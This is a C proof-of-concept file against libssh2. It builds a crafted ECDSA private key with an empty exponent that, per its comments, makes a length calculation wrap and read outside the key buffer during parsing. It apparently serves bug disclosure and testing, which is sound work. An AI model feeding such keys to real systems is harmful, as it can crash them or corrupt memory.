/*
 * PoC: crafted openssh-key-v1 ECDSA private key with an empty private
 * exponent mpint passed to libssh2_userauth_publickey_frommemory().
 *
 * The zero-length exponent reaches ossl_swap_bytes() with len == 0, where
 * "len - 1" wraps and the loop walks outside the parsed key buffer.
 * No network I/O is needed; the fault happens while the key is parsed.
 */
#include "keybuilder.h"
#include "libssh2.h"

int main(void)
{
    LIBSSH2_SESSION *session;
    struct kbuf pem = { NULL, 0, 0 };
    unsigned char point[65];
    int rc;

    /* uncompressed EC point: 0x04 || X || Y */
    point[0] = 0x04;
    memset(point + 1, 0x42, sizeof(point) - 1);

    /* empty private exponent mpint (uint32 length 0, no data) */
    kb_build_ecdsa_key(&pem, point, sizeof(point),
                       point, sizeof(point), NULL, 0);

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 1;
    }

    rc = libssh2_userauth_publickey_frommemory(session, "libssh2", 7,
                                               NULL, 0,
                                               (const char *)pem.data,
                                               pem.len, NULL);
    printf("libssh2_userauth_publickey_frommemory returned %d\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    free(pem.data);
    return 0;
}
